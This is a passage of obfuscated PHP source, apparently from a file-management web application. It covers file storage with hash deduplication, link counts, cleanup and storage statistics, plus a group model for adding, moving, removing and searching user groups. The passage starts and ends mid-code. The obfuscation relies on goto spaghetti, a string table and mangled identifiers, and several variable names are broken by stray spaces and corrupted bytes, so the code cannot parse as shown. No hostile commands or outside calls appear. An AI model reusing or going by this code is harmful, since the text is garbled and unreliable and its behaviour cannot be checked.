$AÍ¶´ï¢Ìº . rand_string(5) . short_id(100); $E„°ŞëØ™¤ = str_replace($dÍ‘Ì›¬­[8], $dÍ‘Ì›¬­[70], KodIO::clear($E„°ŞëØ™¤)); if (!$E„°ŞëØ™¤) { $C½‡²Œö¶» = $dÍ‘Ì›¬­[2129]; } goto cƒªÉàçŠ; eš”¼™ ä: } public function addFileByRemote($cš¹–‰¦“†, $AÛçÒ—×Ò, $c‡êÚÁ„© = array()) { goto BÌ—ƒ²ç˜†; BÌ—ƒ²ç˜†: $BÌ£÷”Æ°© =& $_SERVER[Õİõş]; if (!IO::exist($cš¹–‰¦“†)) { return !1; } $föïÄ®¾»š = $c‡êÚÁ„©[$BÌ£÷”Æ°©[159]] ? $c‡êÚÁ„©[$BÌ£÷”Æ°©[159]] : $BÌ£÷”Æ°©[33]; goto F¤®®‘ÃŒ“; Fæö‰Â‰•Ï: if ($BâøùÀˆòĞ = $this->addFileCheckExist($aƒ…µ•·å[$BÌ£÷”Æ°©[160]], $aƒ…µ•·å[$BÌ£÷”Æ°©[159]], $aƒ…µ•·å[$BÌ£÷”Æ°©[77]])) { return $BâøùÀˆòĞ; } return $this->addFileData($aƒ…µ•·å); goto dˆ¶¢·ë„ñ; F¤®®‘ÃŒ“: $FŒ“¯ÂÓ‚ = IO::hashMd5($cš¹–‰¦“†, $föïÄ®¾»š); $B÷Ç×’¦Ìø = KodIO::defaultDriver(); $aƒ…µ•·å = array($BÌ£÷”Æ°©[515] => IO::size($cš¹–‰¦“†), $BÌ£÷”Æ°©[2134] => 1, $BÌ£÷”Æ°©[382] => $AÛçÒ—×Ò, $BÌ£÷”Æ°©[737] => $B÷Ç×’¦Ìø[$BÌ£÷”Æ°©[363]], $BÌ£÷”Æ°©[383] => $cš¹–‰¦“†, $BÌ£÷”Æ°©[2135] => $c‡êÚÁ„©[$BÌ£÷”Æ°©[160]] ? $c‡êÚÁ„©[$BÌ£÷”Æ°©[160]] : IO::hashSimple($cš¹–‰¦“†), $BÌ£÷”Æ°©[2136] => $FŒ“¯ÂÓ‚ ? $FŒ“¯ÂÓ‚ : $föïÄ®¾»š); goto Fæö‰Â‰•Ï; dˆ¶¢·ë„ñ: } private function addFileData($b¿å…—·ô) { $eù¾Ÿ§‘¤‹ =& $_SERVER[Õİõş]; if (!$b¿å…—·ô) { return !1; } $b¿å…—·ô[$eù¾Ÿ§‘¤‹[77]] = intval($b¿å…—·ô[$eù¾Ÿ§‘¤‹[77]]); if (!$b¿å…—·ô[$eù¾Ÿ§‘¤‹[77]] && strlen($b¿å…—·ô[$eù¾Ÿ§‘¤‹[160]]) > 32) { $b¿å…—·ô[$eù¾Ÿ§‘¤‹[77]] = intval(substr($b¿å…—·ô[$eù¾Ÿ§‘¤‹[160]], 32)); } $b·ÈöÚ³Ö¯ = $this->add($b¿å…—·ô); return $this->find($b·ÈöÚ³Ö¯); } public function addFile($F¥ò‹Ğ¨‰×, $AÒ·ÊõŒä„, $F¡×»¾„ù = false) { $EÆ†Ó¸šç = IO::hashSimple($F¥ò‹Ğ¨‰×); $AÒÀ¤åš× = IO::hashMd5($F¥ò‹Ğ¨‰×); $F¸¦¹ª¨à = IO::size($F¥ò‹Ğ¨‰×); if ($bñ…šÇÈÏœ = $this->addFileCheckExist($EÆ†Ó¸šç, $AÒÀ¤åš×, $F¸¦¹ª¨à)) { return $bñ…šÇÈÏœ; } $EÁµ–Ø¹Ó = $this->addFileMake($F¥ò‹Ğ¨‰×, $F¸¦¹ª¨à, $EÆ†Ó¸šç, $AÒÀ¤åš×, $AÒ·ÊõŒä„, $F¡×»¾„ù); return $this->addFileData($EÁµ–Ø¹Ó); } public function addFileMake($Bà¨Á´Ù­…, $BéêÜ•–’Ø, $C‚šÅ¢í®, $E‘åì‹”’è, $Dô‡™òö, $F®Ù§«×ëµ) { goto a²‰ŒŠÁó; a²‰ŒŠÁó: $aŞù‚‚ãğ¤ =& $_SERVER[Õİõş]; $bâÅõö™¬é = $this->createFileName($Dô‡™òö); $BÇé†·â·Œ = get_path_father($bâÅõö™¬é); goto D”™Ö‰ë„Â; AíÍ‘ŠÑ‡: $FÀ„ìõ¿êŞ = KodIO::defaultDriver(); $F‹â¨ŠÌ¥ª = array($aŞù‚‚ãğ¤[515] => $BéêÜ•–’Ø, $aŞù‚‚ãğ¤[2134] => 1, $aŞù‚‚ãğ¤[382] => $Dô‡™òö, $aŞù‚‚ãğ¤[737] => $FÀ„ìõ¿êŞ[$aŞù‚‚ãğ¤[363]], $aŞù‚‚ãğ¤[383] => $bâÅõö™¬é, $aŞù‚‚ãğ¤[2135] => $C‚šÅ¢í®, $aŞù‚‚ãğ¤[2136] => $E‘åì‹”’è); return $F‹â¨ŠÌ¥ª; goto b²ùáæá‹Á; D”™Ö‰ë„Â: $f§´š†¶¼İ = get_path_this($bâÅõö™¬é); if ($F®Ù§«×ëµ) { $c¥˜¢÷ˆ‡å = IO::move($Bà¨Á´Ù­…, $BÇé†·â·Œ, !1, $f§´š†¶¼İ); } else { $c¥˜¢÷ˆ‡å = IO::copy($Bà¨Á´Ù­…, $BÇé†·â·Œ, !1, $f§´š†¶¼İ); } if (!$c¥˜¢÷ˆ‡å) { return !1; } goto AíÍ‘ŠÑ‡; b²ùáæá‹Á: } public function addFileCheckExist($FàÒëÔ½¥, $BÇÔÚä…„í, $a¥ì¾‡‚·ë) { $a £šÆ—ù– =& $_SERVER[Õİõş]; $E‘¬ åº„ = $this->findByHash($FàÒëÔ½¥, $BÇÔÚä…„í); if (!$E‘¬ åº„) { return !1; } $dÇ…¼´ù»¢ = array($a £šÆ—ù–[2134] => intval($E‘¬ åº„[$a £šÆ—ù–[2137]]) + 1, $a £šÆ—ù–[515] => $a¥ì¾‡‚·ë); $this->where(array($a £šÆ—ù–[415] => $E‘¬ åº„[$a £šÆ—ù–[414]]))->save($dÇ…¼´ù»¢); return $E‘¬ åº„; } public function remove($fù˜åĞÛÎÎ) { $this->linkCountChange($fù˜åĞÛÎÎ, !1); $this->clearEmpty(); return !0; } public function linkAdd($c’Í‰ô“ãô) { $this->linkCountChange($c’Í‰ô“ãô, !0); } public function linkCountChange($e±™ç¶İÆ“, $D¨ˆ¥æ÷ñ±) { goto D—”ùæÕ±; f°¡Œø¬·Â: $DÚ‘Ô‘îƒó = array(); foreach ($e±™ç¶İÆ“ as $EçµßÜ´„¦) { $Cò„ƒÁí‹Ô = $EçµßÜ´„¦ . $dåøë¬–¨÷[33]; if (!$DÚ‘Ô‘îƒó[$Cò„ƒÁí‹Ô]) { $DÚ‘Ô‘îƒó[$Cò„ƒÁí‹Ô] = 0; } $DÚ‘Ô‘îƒó[$Cò„ƒÁí‹Ô]++; } $c²É°ùÜ’Ü = array(); goto e×Ê‘–«˜; e×Ê‘–«˜: foreach ($DÚ‘Ô‘îƒó as $EçµßÜ´„¦ => $e‘ß•êŒ‘È) { $Cò„ƒÁí‹Ô = $e‘ß•êŒ‘È . $dåøë¬–¨÷[33]; if (!$c²É°ùÜ’Ü[$Cò„ƒÁí‹Ô]) { $c²É°ùÜ’Ü[$Cò„ƒÁí‹Ô] = array(); } $c²É°ùÜ’Ü[$Cò„ƒÁí‹Ô][] = $EçµßÜ´„¦; } foreach ($c²É°ùÜ’Ü as $e‘ß•êŒ‘È => $FŞ§øŒø“‚) { if (!$FŞ§øŒø“‚) { continue; } $e‘ß•êŒ‘È = $D¨ˆ¥æ÷ñ± ? $e‘ß•êŒ‘È : -intval($e‘ß•êŒ‘È); $FÈƒ¦šØÌÙ = array($dåøë¬–¨÷[414] => array($dåøë¬–¨÷[7], $FŞ§øŒø“‚)); if ($e‘ß•êŒ‘È < 0) { $FÈƒ¦šØÌÙ[$dåøë¬–¨÷[2137]] = array($dåøë¬–¨÷[933], abs($e‘ß•êŒ‘È)); } $this->where($FÈƒ¦šØÌÙ)->setAdd($dåøë¬–¨÷[2137], $e‘ß•êŒ‘È); } goto A£®™˜¿“; D—”ùæÕ±: $dåøë¬–¨÷ =& $_SERVER[Õİõş]; if (!$e±™ç¶İÆ“) { return; } if (!is_array($e±™ç¶İÆ“)) { $e±™ç¶İÆ“ = array($e±™ç¶İÆ“); } goto f°¡Œø¬·Â; A£®™˜¿“: } public function findByHash($bÚöÛÄï”¥, $dÌäÎ˜ÍŠæ = false) { $AŒ¢Œ„î»‘ =& $_SERVER[Õİõş]; if (!$bÚöÛÄï”¥ && !$dÌäÎ˜ÍŠæ) { return !1; } $b´‡í˜¢‹ = array($AŒ¢Œ„î»‘[2135] => $bÚöÛÄï”¥); if ($dÌäÎ˜ÍŠæ) { $b´‡í˜¢‹ = array($AŒ¢Œ„î»‘[2136] => $dÌäÎ˜ÍŠæ); } return $this->order($AŒ¢Œ„î»‘[2138])->where($b´‡í˜¢‹)->find(); } public function clearEmpty($DÈ ŠåÅ„ = 0) { goto F™Áì‚ÁÖÊ; B½–çø»‘¬: foreach ($cˆÏ¢ŞÏèå as $C™˜¬¶Ğê‘) { $A¡®”Å«¥º->update(1); $this->resetFile($C™˜¬¶Ğê‘); } $A¡®”Å«¥º->end(); goto aÃ‘éè¹æ±; DÆØÚ»Ìœô: $cˆÏ¢ŞÏèå = $this->where($fŠšğƒ³¨)->select(); if (!$cˆÏ¢ŞÏèå) { return; } $A¡®”Å«¥º = new Task($EÊ¿ƒäÙİ[2140], $EÊ¿ƒäÙİ[33], count($cˆÏ¢ŞÏèå)); goto B½–çø»‘¬; F™Áì‚ÁÖÊ: $EÊ¿ƒäÙİ =& $_SERVER[Õİõş]; $EÌ…áÓ¯ = time() - 3600 * 24 * $DÈ ŠåÅ„; $fŠšğƒ³¨ = $EÊ¿ƒäÙİ[2139] . $EÌ…áÓ¯; goto DÆØÚ»Ìœô; aÃ‘éè¹æ±: } private function resetFile($fš§øõë´Ã) { goto aî´ˆºÎ»‘; EÒ¹™èÔŞæ: if ($fš§øõë´Ã[$Aì»Šë¾¨…[2137]] != $e‡ù¡œàïÖ) { $this->where($E…ƒÌÈñÆ)->save(array($Aì»Šë¾¨…[2134] => $e‡ù¡œàïÖ)); } goto b­´Ù”‚¤; c›É—‡øí: $bŒŒâã„» = Model($Aì»Šë¾¨…[2141])->where($E…ƒÌÈñÆ)->count(); $e‡ù¡œàïÖ = intval($a²©ÑùšìÑ) + intval($bŒŒâã„»); if ($e‡ù¡œàïÖ == 0) { IO::remove($fš§øõë´Ã[$Aì»Šë¾¨…[75]]); $this->where($E…ƒÌÈñÆ)->delete(); $this->metaSet($fš§øõë´Ã[$Aì»Šë¾¨…[414]], null, null); return; } goto EÒ¹™èÔŞæ; aî´ˆºÎ»‘: $Aì»Šë¾¨… =& $_SERVER[Õİõş]; $E…ƒÌÈñÆ = array($Aì»Šë¾¨…[415] => $fš§øõë´Ã[$Aì»Šë¾¨…[414]]); $a²©ÑùšìÑ = Model($Aì»Šë¾¨…[1113])->where($E…ƒÌÈñÆ)->count(); goto c›É—‡øí; b­´Ù”‚¤: } public function storageInfo($a†“‹å‚ = false) { goto f¾°•ÉºÕ; dÜõóÛ…œ: $c±–İ¶çÏ = 1; $f‰±Ïô¢ ¦ = 0; $c˜°Ë·†ÅØ = 5000; goto A±‚Ö¢ÕÙ¦; f¾°•ÉºÕ: $Eö±’‘ø¨ƒ =& $_SERVER[Õİõş]; $AÅÇø‰‹õ— = $this->count() + 0.0; $D’ˆ´¶¹†Ğ = 0; goto dÜõóÛ…œ; A±‚Ö¢ÕÙ¦: for ($eÃÊ† ©±Ò = 0; $eÃÊ† ©±Ò < $AÅÇø‰‹õ—; $eÃÊ† ©±Ò = $eÃÊ† ©±Ò + $c˜°Ë·†ÅØ) { $aœ§İ«Öçƒ = $this->limit($eÃÊ† ©±Ò, $eÃÊ† ©±Ò + $c˜°Ë·†ÅØ)->select(); foreach ($aœ§İ«Öçƒ as $b¼âØƒîîÑ) { $c±–İ¶çÏ += $b¼âØƒîîÑ[$Eö±’‘ø¨ƒ[77]] * $b¼âØƒîîÑ[$Eö±’‘ø¨ƒ[2137]]; $D’ˆ´¶¹†Ğ += $b¼âØƒîîÑ[$Eö±’‘ø¨ƒ[77]] * ($b¼âØƒîîÑ[$Eö±’‘ø¨ƒ[2137]] - 1); $f‰±Ïô¢ ¦ += $b¼âØƒîîÑ[$Eö±’‘ø¨ƒ[2137]]; } } $fÉä±çò¡ = array($Eö±’‘ø¨ƒ[2142] => $c±–İ¶çÏ, $Eö±’‘ø¨ƒ[2143] => $D’ˆ´¶¹†Ğ, $Eö±’‘ø¨ƒ[2144] => $D’ˆ´¶¹†Ğ / $c±–İ¶çÏ, $Eö±’‘ø¨ƒ[81] => $AÅÇø‰‹õ—, $Eö±’‘ø¨ƒ[2145] => $f‰±Ïô¢ ¦); return $fÉä±çò¡; goto eÁŒ²´Éß; eÁŒ²´Éß: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\x6d\x65" => "\147\x72\x6f\x75\160\x5f\155\x65\x74\141", "\x6d\x65\x74\x61\x46\x69\x65\x6c\144" => "\x67\162\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($aŠŠÏé¯½Š) { $dÙ¸øÚ¹ã… =& $_SERVER[Õİõş]; return array($dÙ¸øÚ¹ã…[2146] => array($aŠŠÏé¯½Š[0], $dÙ¸øÚ¹ã…[2147]), $dÙ¸øÚ¹ã…[2148] => array($aŠŠÏé¯½Š[0], $dÙ¸øÚ¹ã…[2147])); } protected function getInfo($B—†®ÛæÆ¾) { $c¾ºéÓ´—¬ = $this->getInfoSimple($B—†®ÛæÆ¾); if (!$c¾ºéÓ´—¬) { return !1; } return $this->_listDataApplyItem($c¾ºéÓ´—¬); } protected function getInfoSimple($DßôÛÜ™ù‘, $C«ĞÚ•ƒš = false) { $b‹‰É™ËÚĞ =& $_SERVER[Õİõş]; if ($C«ĞÚ•ƒš) { $bæÕìªºóò = array($b‹‰É™ËÚĞ[2080] => intval($DßôÛÜ™ù‘)); $b™„Ğ…İ…“ = $this->where($bæÕìªºóò)->find(); return is_array($b™„Ğ…İ…“) ? $b™„Ğ…İ…“ : array(); } return $this->cacheFunctionGet($b‹‰É™ËÚĞ[2149], $DßôÛÜ™ù‘); } protected function groupAdd($A»¼óôçøŸ) { goto E•èÕÕÇÈÀ; fºÓæâ»ç: if ($c³ğ¬ ÀÃ›[$b¯ã “øŸó[454]]) { $Eö¼ÛôÓÚë = $c³ğ¬ ÀÃ›[$b¯ã “øŸó[454]] . $c³ğ¬ ÀÃ›[$b¯ã “øŸó[2080]] . $b¯ã “øŸó[47]; } $CÃÙùöƒ˜ğ = array($b¯ã “øŸó[382] => $this->groupNameAuto($A»¼óôçøŸ[$b¯ã “øŸó[456]], $A»¼óôçøŸ[$b¯ã “øŸó[28]]), $b¯ã “øŸó[364] => $A»¼óôçøŸ[$b¯ã “øŸó[456]], $b¯ã “øŸó[520] => $Eö¼ÛôÓÚë, $b¯ã “øŸó[2150] => $A»¼óôçøŸ[$b¯ã “øŸó[2064]], $b¯ã “øŸó[2151] => 0, $b¯ã “øŸó[2084] => 0); if (isset($A»¼óôçøŸ[$b¯ã “øŸó[2101]])) { $CÃÙùöƒ˜ğ[$b¯ã “øŸó[2101]] = $A»¼óôçøŸ[$b¯ã “øŸó[2101]]; } else { $C½¼ÜÈñÕ« = $this->max($b¯ã “øŸó[2101]); if (!$C½¼ÜÈñÕ«) { $C½¼ÜÈñÕ« = 0; } $CÃÙùöƒ˜ğ[$b¯ã “øŸó[2101]] = $C½¼ÜÈñÕ« + 1; } goto Dˆ¤Åå¼§õ; E•èÕÕÇÈÀ: $b¯ã “øŸó =& $_SERVER[Õİõş]; if (!$A»¼óôçøŸ[$b¯ã “øŸó[456]] && isset($A»¼óôçøŸ[$b¯ã “øŸó[2080]]) && $A»¼óôçøŸ[$b¯ã “øŸó[2080]] == 1) { if ($c³ğ¬ ÀÃ› = $this->getInfoSimple($A»¼óôçøŸ[$b¯ã “øŸó[2080]], !0)) { return $A»¼óôçøŸ[$b¯ã “øŸó[2080]]; } } else { $c³ğ¬ ÀÃ› = $this->getInfoSimple($A»¼óôçøŸ[$b¯ã “øŸó[456]]); if (!$c³ğ¬ ÀÃ›) { return !1; } } $Eö¼ÛôÓÚë = $b¯ã “øŸó[465]; goto fºÓæâ»ç; cçŒáØª‹: Model($b¯ã “øŸó[1113])->groupRootAdd($cí®å‘´¬™); return $cí®å‘´¬™; goto dÕ¹ëÕÍŠÌ; Dˆ¤Åå¼§õ: if (!empty($A»¼óôçøŸ[$b¯ã “øŸó[2080]])) { $CÃÙùöƒ˜ğ[$b¯ã “øŸó[2080]] = $A»¼óôçøŸ[$b¯ã “øŸó[2080]]; } $cí®å‘´¬™ = $this->add($CÃÙùöƒ˜ğ); $this->setNamePinyin($cí®å‘´¬™, $CÃÙùöƒ˜ğ[$b¯ã “øŸó[28]]); goto cçŒáØª‹; dÕ¹ëÕÍŠÌ: } protected function groupEdit($C§Ú ÆÆƒ³, $D±‚¾ÛŠ†) { $aø‡ŞÀÕÓ =& $_SERVER[Õİõş]; if (!empty($D±‚¾ÛŠ†[$aø‡ŞÀÕÓ[456]])) { $F£É¾Áˆ»Ì = $this->getInfoSimple($C§Ú ÆÆƒ³); $CŞòšæÕê = $this->getInfoSimple($D±‚¾ÛŠ†[$aø‡ŞÀÕÓ[456]]); if (!$F£É¾Áˆ»Ì || !$CŞòšæÕê) { return !1; } if ($F£É¾Áˆ»Ì[$aø‡ŞÀÕÓ[2080]] == $CŞòšæÕê[$aø‡ŞÀÕÓ[2080]]) { return !1; } if ($D±‚¾ÛŠ†[$aø‡ŞÀÕÓ[456]] != $F£É¾Áˆ»Ì[$aø‡ŞÀÕÓ[456]]) { if ($CŞòšæÕê[$aø‡ŞÀÕÓ[454]] !== $F£É¾Áˆ»Ì[$aø‡ŞÀÕÓ[454]] && strpos($CŞòšæÕê[$aø‡ŞÀÕÓ[454]], $F£É¾Áˆ»Ì[$aø‡ŞÀÕÓ[454]] . $F£É¾Áˆ»Ì[$aø‡ŞÀÕÓ[2080]] . $aø‡ŞÀÕÓ[47]) === 0) { return !1; } $D±‚¾ÛŠ†[$aø‡ŞÀÕÓ[520]] = $CŞòšæÕê[$aø‡ŞÀÕÓ[454]] . $D±‚¾ÛŠ†[$aø‡ŞÀÕÓ[456]] . $aø‡ŞÀÕÓ[47]; $this->_changeChildLevel($F£É¾Áˆ»Ì, $CŞòšæÕê); } } if (isset($D±‚¾ÛŠ†[$aø‡ŞÀÕÓ[28]])) { $this->setNamePinyin($C§Ú ÆÆƒ³, $D±‚¾ÛŠ†[$aø‡ŞÀÕÓ[28]]); } return $this->where(array($aø‡ŞÀÕÓ[2152] => $C§Ú ÆÆƒ³))->save($D±‚¾ÛŠ†); } private function _changeChildLevel($E¹¹‚ Á, $eâµ»¤æ§, $bß˜“½Ğç² = false) { goto d‚¥±ö‹êÖ; d‚¥±ö‹êÖ: $DÖ°Ø¯Š«Ê =& $_SERVER[Õİõş]; $dèÕÛÅ½ã = $E¹¹‚ Á[$DÖ°Ø¯Š«Ê[454]] . $E¹¹‚ Á[$DÖ°Ø¯Š«Ê[2080]] . $DÖ°Ø¯Š«Ê[47]; $C¤ÆÍé = $eâµ»¤æ§[$DÖ°Ø¯Š«Ê[454]] . $eâµ»¤æ§[$DÖ°Ø¯Š«Ê[2080]] . $DÖ°Ø¯Š«Ê[47] . $E¹¹‚ Á[$DÖ°Ø¯Š«Ê[2080]] . $DÖ°Ø¯Š«Ê[47]; goto CÙˆËÛà“÷; CÙˆËÛà“÷: if ($bß˜“½Ğç²) { $C¤ÆÍé = $eâµ»¤æ§[$DÖ°Ø¯Š«Ê[454]] . $eâµ»¤æ§[$DÖ°Ø¯Š«Ê[2080]] . $DÖ°Ø¯Š«Ê[47]; } $Bøêï¡ Õˆ = array($DÖ°Ø¯Š«Ê[520] => array($DÖ°Ø¯Š«Ê[478], $E¹¹‚ Á[$DÖ°Ø¯Š«Ê[454]] . $E¹¹‚ Á[$DÖ°Ø¯Š«Ê[2080]] . $DÖ°Ø¯Š«Ê[479])); $b™âàî¹š = array($DÖ°Ø¯Š«Ê[520] => array($DÖ°Ø¯Š«Ê[529], "\162\x65\160\x6c\x61\143\145\x28\160\x61\x72\145\156\164\x4c\x65\166\145\x6c\54\47{$dèÕÛÅ½ã}\x27\x2c\x27{$C¤ÆÍé}\47\x29")); goto eÂàëÅ”é»; eÂàëÅ”é»: $this->where($Bøêï¡ Õˆ)->data($b™âàî¹š)->save(); goto déÚ‹Ç†³ê; déÚ‹Ç†³ê: } public function setNamePinyin($bÒÌ«½“Ù, $CâŒ–¢¾óË = false) { $f¡åË£Ÿ«‘ =& $_SERVER[Õİõş]; if (!$CâŒ–¢¾óË) { $C…ºÑ‚Ş¡ = $this->getInfoSimple($bÒÌ«½“Ù); $CâŒ–¢¾óË = $C…ºÑ‚Ş¡[$f¡åË£Ÿ«‘[28]]; } if (!Input::check($CâŒ–¢¾óË, $f¡åË£Ÿ«‘[523])) { $this->metaSet($bÒÌ«½“Ù, $f¡åË£Ÿ«‘[411], null); $this->metaSet($bÒÌ«½“Ù, $f¡åË£Ÿ«‘[410], null); return; } $eÙ¹ĞñË ˆ = array($f¡åË£Ÿ«‘[411] => str_replace($f¡åË£Ÿ«‘[50], $f¡åË£Ÿ«‘[33], Pinyin::encode($CâŒ–¢¾óË)), $f¡åË£Ÿ«‘[410] => Pinyin::encode($CâŒ–¢¾óË, $f¡åË£Ÿ«‘[524])); $this->metaSet($bÒÌ«½“Ù, $eÙ¹ĞñË ˆ); } protected function groupStatus($aÊµöò¨¥, $f—…ğá¤å, $aÀ§ŒïÃØ = true) { $A¬°ìˆµ˜ =& $_SERVER[Õİõş]; $bãÆÃˆŠ¡ö = $this->getInfoSimple($aÊµöò¨¥); if (!$bãÆÃˆŠ¡ö) { return !1; } if ($aÀ§ŒïÃØ) { $this->_groupStatusApply($bãÆÃˆŠ¡ö, $f—…ğá¤å); } $b‚¯ôÒöÒ› = array($A¬°ìˆµ˜[2080] => $aÊµöò¨¥, $A¬°ìˆµ˜[89] => $A¬°ìˆµ˜[691], $A¬°ìˆµ˜[355] => $f—…ğá¤å); return Model($A¬°ìˆµ˜[2153])->add($b‚¯ôÒöÒ›, array(), !0); } private function _groupStatusApply($eÀÉ«Ò†‚´, $F­ÉÑº÷ˆ) { $bö°ˆøåá§ =& $_SERVER[Õİõş]; if ($F­ÉÑº÷ˆ == $bö°ˆøåá§[83]) { $F÷¹ù‰¨¥Š = $this->parentLevelArray($eÀÉ«Ò†‚´[$bö°ˆøåá§[454]]); } else { $F—Òà°Òƒ = array($bö°ˆøåá§[520] => array($bö°ˆøåá§[478], $eÀÉ«Ò†‚´[$bö°ˆøåá§[454]] . $eÀÉ«Ò†‚´[$bö°ˆøåá§[2080]] . $bö°ˆøåá§[479])); $F÷¹ù‰¨¥Š = $this->where($F—Òà°Òƒ)->field($bö°ˆøåá§[2080])->select(); $F÷¹ù‰¨¥Š = array_to_keyvalue($F÷¹ù‰¨¥Š, $bö°ˆøåá§[33], $bö°ˆøåá§[2080]); } if (empty($F÷¹ù‰¨¥Š)) { return; } $F—Òà°Òƒ = array($bö°ˆøåá§[2080] => array($bö°ˆøåá§[7], $F÷¹ù‰¨¥Š), $bö°ˆøåá§[89] => $bö°ˆøåá§[691], $bö°ˆøåá§[355] => $F­ÉÑº÷ˆ ? $bö°ˆøåá§[463] : $bö°ˆøåá§[83]); Model($bö°ˆøåá§[2153])->where($F—Òà°Òƒ)->save(array($bö°ˆøåá§[355] => $F­ÉÑº÷ˆ)); } protected function groupRemove($fàê„…Åö) { goto B»éŠƒ¼‡”; EĞ‹¡éÔÙ: if (!$Aà”´ || $Aà”´[$cù àÎ‘Ş¸[456]] == 0) { return !1; } $C“™„½•ÂŞ = $this->getInfoSimple($Aà”´[$cù àÎ‘Ş¸[456]]); $this->_changeChildLevel($Aà”´, $C“™„½•ÂŞ, !0); goto f²Â–ä¸ãˆ; AŒë·Á‹„Ù: Model($cù àÎ‘Ş¸[754])->groupRootRemove($fàê„…Åö); return $this->where($BÂÈ¥«õ„Ù)->delete(); goto B¹°ÄÖ Å…; f²Â–ä¸ãˆ: $this->where(array($cù àÎ‘Ş¸[456] => $fàê„…Åö))->save(array($cù àÎ‘Ş¸[456] => $Aà”´[$cù àÎ‘Ş¸[456]])); Model($cù àÎ‘Ş¸[2153])->where($BÂÈ¥«õ„Ù)->delete(); Model($cù àÎ‘Ş¸[2154])->where($BÂÈ¥«õ„Ù)->delete(); goto AŒë·Á‹„Ù; B»éŠƒ¼‡”: $cù àÎ‘Ş¸ =& $_SERVER[Õİõş]; $BÂÈ¥«õ„Ù = array($cù àÎ‘Ş¸[2080] => $fàê„…Åö); $Aà”´ = $this->where($BÂÈ¥«õ„Ù)->find(); goto EĞ‹¡éÔÙ; B¹°ÄÖ Å…: } public function listData() { $f ‰é„­ÛÌ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($f ‰é„­ÛÌ[$_SERVER[Õİõş][350]]); return $f ‰é„­ÛÌ; } private function _makeOrder($EìÅ¹À† = '') { goto bÜõÄ™‰Ï; C„¹ÀÍ£: $EìÅ¹À† = $EìÅ¹À† . "{$c½‘ÖÃ}\40{$A•è‘’Ôì}\x2c\x20\147\x72\x6f\x75\160\111\x44\40\141\x73\x63"; return $this->order($EìÅ¹À†); goto CŸ¤â‰ï¯“; A¡â—ÁÂß: $c½‘ÖÃ = Input::get($B¾«“¦…Á[402], $B¾«“¦…Á[7], $B¾«“¦…Á[2084], $B²ëğÔ‡ø); $A•è‘’Ôì = Input::get($B¾«“¦…Á[403], $B¾«“¦…Á[7], $B¾«“¦…Á[2155], array($B¾«“¦…Á[2155], $B¾«“¦…Á[399])); $A•è‘’Ôì = $E³‰Èé”ìƒ[$A•è‘’Ôì]; goto C„¹ÀÍ£; bÜõÄ™‰Ï: $B¾«“¦…Á =& $_SERVER[Õİõş]; $B²ëğÔ‡ø = array($B¾«“¦…Á[2080], $B¾«“¦…Á[28], $B¾«“¦…Á[2066], $B¾«“¦…Á[183]); $E³‰Èé”ìƒ = array($B¾«“¦…Á[397] => $B¾«“¦…Á[398], $B¾«“¦…Á[399] => $B¾«“¦…Á[400]); goto A¡â—ÁÂß; CŸ¤â‰ï¯“: } public function listChild($fñæéÊã¯š) { $eÖª»¸”‹Ç =& $_SERVER[Õİõş]; $AÆ„§Ù±Æœ = $this->where(array($eÖª»¸”‹Ç[456] => $fñæéÊã¯š))->_makeOrder()->selectPage(200); $this->_listDataApply($AÆ„§Ù±Æœ[$eÖª»¸”‹Ç[350]]); return $AÆ„§Ù±Æœ; } public function listByID($a›ñâ²Ä´æ) { $c£Ê¸§ˆ²´ =& $_SERVER[Õİõş]; if (!$a›ñâ²Ä´æ) { return array(); } $f¥‹éÛ‡öó = array($c£Ê¸§ˆ²´[2080] => array($c£Ê¸§ˆ²´[7], $a›ñâ²Ä´æ)); $cÇêóö…¤ˆ = $this->where($f¥‹éÛ‡öó)->select(); $this->_listDataApply($cÇêóö…¤ˆ); return $cÇêóö…¤ˆ; } public function listSearch($CÂ»ß³ÇÌ) { goto D‡ç°¬ºÕŠ; D‡ç°¬ºÕŠ: $EñŞ§´Ùµ =& $_SERVER[Õİõş]; $CåÎ³¦® = $CÂ»ß³ÇÌ[$EñŞ§´Ùµ[2156]]; $eôñÒ¿´ˆ = isset($CÂ»ß³ÇÌ[$EñŞ§´Ùµ[2157]]) ? $CÂ»ß³ÇÌ[$EñŞ§´Ùµ[2157]] : !1; goto F»¾©÷¡¼; F»¾©÷¡¼: if (!trim($CåÎ³¦®)) { return !1; } $CåÎ³¦® = str_replace($EñŞ§´Ùµ[2158], $EñŞ§´Ùµ[2159], $CåÎ³¦®); $Cô¤ù«Äî÷ = array($EñŞ§´Ùµ[2080] => array($EñŞ§´Ùµ[753], "\x25{$CåÎ³¦®}\45"), $EñŞ§´Ùµ[28] => array($EñŞ§´Ùµ[753], "\45{$CåÎ³¦®}\x25"), $EñŞ§´Ùµ[918] => $EñŞ§´Ùµ[2160]); goto d™ˆŸÇòÇ; d™ˆŸÇòÇ: $F¡Õ£¨ªÇË = $this->_makeOrder()->where($Cô¤ù«Äî÷)->selectPage(20); $F¡Õ£¨ªÇË = $F¡Õ£¨ªÇË ? $F¡Õ£¨ªÇË : array(); if (!$F¡Õ£¨ªÇË || count($F¡Õ£¨ªÇË[$EñŞ§´Ùµ[350]]) < 5 && Input::check($CåÎ³¦®, $EñŞ§´Ùµ[302])) { $D¸±Ÿ„ìøÒ = $this->_searchFromMeta($EñŞ§´Ùµ[410], $CåÎ³¦®, 10); $Bİå±›õ‹‹ = $this->_searchFromMeta($EñŞ§´Ùµ[411], $CåÎ³¦®, 10); $E÷·öÕë× = array_merge($D¸±Ÿ„ìøÒ, $Bİå±›õ‹‹, $F¡Õ£¨ªÇË[$EñŞ§´Ùµ[350]]); $F¡Õ£¨ªÇË[$EñŞ§´Ùµ[350]] = array_unique_by_key($E÷·öÕë×, $EñŞ§´Ùµ[2080]); $F¡Õ£¨ªÇË[$EñŞ§´Ùµ[347]][$EñŞ§´Ùµ[348]] = count($F¡Õ£¨ªÇË[$EñŞ§´Ùµ[350]]); $F¡Õ£¨ªÇË[$EñŞ§´Ùµ[347]][$EñŞ§´Ùµ[349]] = ceil($F¡Õ£¨ªÇË[$EñŞ§´Ùµ[347]][$EñŞ§´Ùµ[348]] / $F¡Õ£¨ªÇË[$EñŞ§´Ùµ[347]][$EñŞ§´Ùµ[345]]); } goto E¦›ŒõßØ; E¦›ŒõßØ: $this->_listDataApply($F¡Õ£¨ªÇË[$EñŞ§´Ùµ[350]]); return 